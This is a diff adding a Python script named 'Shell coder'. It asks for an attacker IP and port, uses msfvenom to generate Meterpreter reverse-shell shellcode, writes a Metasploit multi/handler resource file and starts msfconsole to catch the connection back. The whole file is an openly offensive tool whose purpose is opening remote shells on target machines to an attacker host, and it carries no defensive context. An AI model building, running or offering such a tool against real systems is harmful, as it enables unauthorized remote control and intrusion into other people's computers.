@@ -1,0 +1,62 @@
+
+# ############
+# LIBRARIES #
+#############
+import subprocess
+import sys
+
+# Console colors
+W = '\033[0m'  # white (normal)
+R = '\033[31m'  # red
+G = '\033[32m'  # green
+O = '\033[33m'  # orange
+B = '\033[34m'  # blue
+P = '\033[35m'  # purple
+C = '\033[36m'  # cyan
+GR = '\033[37m'  # gray
+
+def usage():
+    print("""
+  ####   #    #  ######  #       #        ####    ####   #####   ######  #####
+ #       #    #  #       #       #       #    #  #    #  #    #  #       #    #
+  ####   ######  #####   #       #       #       #    #  #    #  #####   #    #
+      #  #    #  #       #       #       #       #    #  #    #  #       #####
+ #    #  #    #  #       #       #       #    #  #    #  #    #  #       #   #
+  ####   #    #  ######  ######  ######   ####    ####   #####   ######  #    #
+
+Written by: Egycondor
+Company: https://www.Saluslab.net
+Shell coder is a tool that attempts to generate a shell code and listener to connect back after the execution 
+""")
+usage()
+subprocess.Popen("touch shlc0der.rc", shell=True)
+try:
+    input = raw_input # Py2/3 compatibility
+except NameError:
+    pass
+
+def create_rc(revhost, payload, port):
+    with open("shlc0der.rc","w") as filewrite:
+        filewrite.write("use exploit/multi/handler\n"
+                        "set payload {0}\n"
+                        "set LPORT {1}\n"
+                        "set LHOST {2}\n"
+                        "exploit\n\n".format(payload, port,revhost))
+def launch_msf():
+    subprocess.Popen("msfconsole -r shlc0der.rc", shell=True).wait()
+
+
+revhost = input("Enter your LHOST (attacker IP address) for the reverse listener: ")
+revport = input("Enter your LPORT (attacker port) for the reverse listener: ")
+payload = input("Enter your payload (example: windows/meterpreter/reverse_tcp) - just hit enter for linux/reverse_tcp: ")
+if not payload:
+    payload = "linux/x86/meterpreter/reverse_tcp"
+# create the rc file
+create_rc(revhost, payload, revport)
+# generate the shell code
+print O + "Please copy the below shell code and press Enter to start the listener"
+print subprocess.check_output("msfvenom -p {0} LHOST={1} LPORT={2} -b x00 -f py".format(payload,revhost,revport),shell = True) + W
+input()
+# launch msf
+launch_msf()
+
